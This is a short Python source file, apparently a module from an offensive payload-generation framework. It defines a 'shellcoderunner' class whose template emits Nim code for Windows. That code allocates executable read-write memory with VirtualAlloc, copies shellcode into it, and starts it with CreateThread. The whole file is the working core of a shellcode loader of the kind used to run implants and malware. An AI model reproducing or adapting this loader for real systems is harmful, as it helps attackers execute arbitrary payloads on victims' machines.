class shellcoderunner:
    def __init__(self, arguments):
        pass

    def imports(self) -> list[str]:
        return ['import winim/lean']

    def compilerOptions(self) -> list[str]:
        return []

    def template(self, imports, codeblocks, transformers, shellcodeSize) -> str:
        return f"""
{imports}
{codeblocks}

proc main() =
    
    {transformers}

    let address = VirtualAlloc(NULL, {shellcodeSize}, MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE)
    copyMem(address, addr(shellcode[0]), {shellcodeSize})
    let hThread = CreateThread(NULL, 0.SIZE_T, cast[LPTHREAD_START_ROUTINE](address), NULL, 0, NULL)
    WaitForSingleObject(hThread, INFINITE)

main()
"""